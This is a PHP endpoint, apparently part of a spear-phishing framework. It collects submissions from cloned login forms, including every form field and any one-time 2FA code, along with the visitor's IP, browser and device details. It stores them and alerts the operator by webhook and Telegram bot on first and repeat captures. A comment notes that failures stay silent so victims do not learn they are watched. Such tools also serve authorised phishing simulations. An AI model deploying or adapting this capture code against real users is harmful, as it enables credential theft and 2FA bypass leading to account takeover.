<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');
$_db_file = dirname(__FILE__) . '/spear/config/db.php';
if (!file_exists($_db_file)) {
    http_response_code(404);
    exit;
}
require_once($_db_file);
require_once(dirname(__FILE__) . '/spear/manager/common_functions.php');
require_once(dirname(__FILE__) . '/spear/manager/secret_at_rest.php');
require_once(dirname(__FILE__) . '/spear/manager/capture_alerting.php');
require_once(dirname(__FILE__) . '/spear/manager/telegram_alerting.php');
require_once(dirname(__FILE__) . '/spear/libs/browser_detect/BrowserDetection.php');
date_default_timezone_set('UTC');
//-------------------------------------
if (isset($_POST))
    $POSTJ = json_decode(file_get_contents('php://input'),true);
else
    die();

//---SP verification req----
if(isset($POSTJ['sp_ver']))
    die("success");
//--------------------------

if(isset($POSTJ['rid']) && !empty($POSTJ['rid']))
    $rid = doFilter($POSTJ['rid'],'ALPHA_NUM');
else
    die("No rid");
    
if(isset($POSTJ['sess_id']))
    $session_id = doFilter($POSTJ['sess_id'],'ALPHA_NUM');
else
    $session_id = 'Failed';

if(isset($POSTJ['trackerId']))
    $trackerId = doFilter($POSTJ['trackerId'],'ALPHA_NUM');
else
    $trackerId = 'Failed';

$ua_info = new Wolfcast\BrowserDetection();
$public_ip = getPublicIP();

$user_agent = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);    

$date_time = round(microtime(true) * 1000);
$user_browser = $ua_info->getName().' '.($ua_info->getVersion() == "unknown"?"":$ua_info->getVersion());
$user_os = $ua_info->getPlatformVersion();
$device_type = $ua_info->isMobile()?"Mobile":"Desktop";
if(empty($POSTJ['ip_info']))
    $ip_info = getIPInfo($conn, $public_ip);
else
    $ip_info = json_encode(craftIPInfoArr($POSTJ['ip_info']));

//-----------------------------------
if(isset($POSTJ['screen_res']))
    $screen_res = htmlspecialchars($POSTJ['screen_res']);
else
    $screen_res = 'Failed'; 

//Check tracker stopped/paused
$stmt = $conn->prepare("SELECT active FROM tb_core_web_tracker_list WHERE tracker_id = ?");
$stmt->bind_param("s", $trackerId);
$stmt->execute();
$result = $stmt->get_result()->fetch_assoc() ;
if($result["active"] == 0)
  return;
  
$page = $POSTJ['page'];
if($page == 0){  //page visit
	$stmt = $conn->prepare("INSERT INTO tb_data_webpage_visit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type) VALUES(?,?,?,?,?,?,?,?,?,?,?)");
	$stmt->bind_param('sssssssssss', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type);
	if ($stmt->execute() === TRUE)
		die('success'); 
	else 
		die("failed"); 
}  
elseif(is_numeric($page)){
    foreach ($POSTJ['form_field_data'] as $i => $field_data) {
        $POSTJ['form_field_data'][$i] = htmlspecialchars($POSTJ['form_field_data'][$i]);
    }
    $form_field_data = json_encode($POSTJ['form_field_data']);

    // Phase 3.42: optional 2FA code (cloned login forms with a code field
    // send it as POSTJ.code_2fa). Stored alongside the field-data row.
    $code_2fa = isset($POSTJ['code_2fa'])
        ? htmlspecialchars(substr((string)$POSTJ['code_2fa'], 0, 16))
        : null;
    $has_2fa = $code_2fa !== null && $code_2fa !== '';

    // The capture landings post the OTP top-level (POSTJ.code_2fa), so it
    // lands in the dedicated code_2fa column — which the Web-Tracker report's
    // Field-<name> resolver (tracker_report_manager) never reads, leaving the
    // built `Field-code_2fa` column empty. Mirror it into form_field_data
    // (only when the form didn't already carry its own code_2fa input) so the
    // captured code surfaces as a report column, alongside the alert/summary
    // paths that key off the dedicated column.
    if ($has_2fa && !array_key_exists('code_2fa', $POSTJ['form_field_data'])) {
        $POSTJ['form_field_data']['code_2fa'] = $code_2fa;
        $form_field_data = json_encode($POSTJ['form_field_data']);
    }

    $is_first = taphish_is_first_capture($conn, $trackerId, $rid);
    $is_2fa_capture = $has_2fa ? 1 : 0;

    $stmt = $conn->prepare("INSERT INTO tb_data_webform_submit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type,page,form_field_data,code_2fa,is_2fa_capture) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
    $stmt->bind_param('ssssssssssssssi', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type,$page,$form_field_data,$code_2fa,$is_2fa_capture);
    if ($stmt->execute() === TRUE) {
        $inserted_id = (int) $conn->insert_id;
        if ($is_first) {
            // First capture per recipient on this campaign — fire the
            // operator webhook if one is configured. Failure is silent
            // (we don't want to leak that we're watching).
            $capture_event = [
                'campaign'        => '', // tracker_id, no campaign-name lookup here
                'campaign_id'     => $trackerId,
                'recipient_name'  => '',
                'recipient_email' => '',
                'captured_at'     => $date_time,
                'page'            => (int)$page,
                'ip'              => $public_ip,
                'has_2fa'         => $has_2fa,
            ];
            $hook_url = taphish_get_capture_webhook_url($conn);
            if ($hook_url !== '') {
                @taphish_capture_dispatch_webhook($hook_url, taphish_capture_webhook_payload($capture_event));
            }
            // Phase 3.53: Telegram bot channel fires on the same event,
            // independently of the generic webhook above.
            if (function_exists('taphish_telegram_notify_capture')) {
                @taphish_telegram_notify_capture($conn, $capture_event);
            }
            if (function_exists('logIt')) {
                logIt('Capture: first submit on tracker ' . $trackerId . ($has_2fa ? ' [+2FA]' : ''));
            }
        } elseif ($has_2fa) {
            // Phase 3.45e: repeat capture with a 2FA code → fire the
            // repeat-capture webhook so the operator hears about it.
            $hook_url = taphish_get_capture_webhook_url($conn);
            $row_for_guard = ['code_2fa' => $code_2fa, 'repeat_webhook_sent' => 0];
            if (taphish_should_send_repeat_capture_webhook($row_for_guard)) {
                $repeat_event = [
                    'campaign'        => '',
                    'campaign_id'     => $trackerId,
                    'recipient_name'  => '',
                    'recipient_email' => '',
                    'captured_at'     => $date_time,
                    'page'            => (int)$page,
                    'ip'              => $public_ip,
                    'has_2fa'         => true,
                    'is_repeat'       => true,
                ];
                if ($hook_url !== '') {
                    @taphish_capture_dispatch_webhook($hook_url, taphish_repeat_capture_webhook_payload($repeat_event));
                }
                // Phase 3.53: Telegram repeat-capture alert.
                if (function_exists('taphish_telegram_notify_capture')) {
                    @taphish_telegram_notify_capture($conn, $repeat_event);
                }
                if ($inserted_id > 0) {
                    $upd = $conn->prepare("UPDATE tb_data_webform_submit SET repeat_webhook_sent = 1 WHERE id = ?");
                    if ($upd) {
                        $upd->bind_param('i', $inserted_id);
                        $upd->execute();
                        $upd->close();
                    }
                }
                if (function_exists('logIt')) {
                    logIt('Capture: repeat 2FA on tracker ' . $trackerId);
                }
            }
        }
        die('success');
    } else {
        die("failed");
    }
}

//-----------------------------------------


?>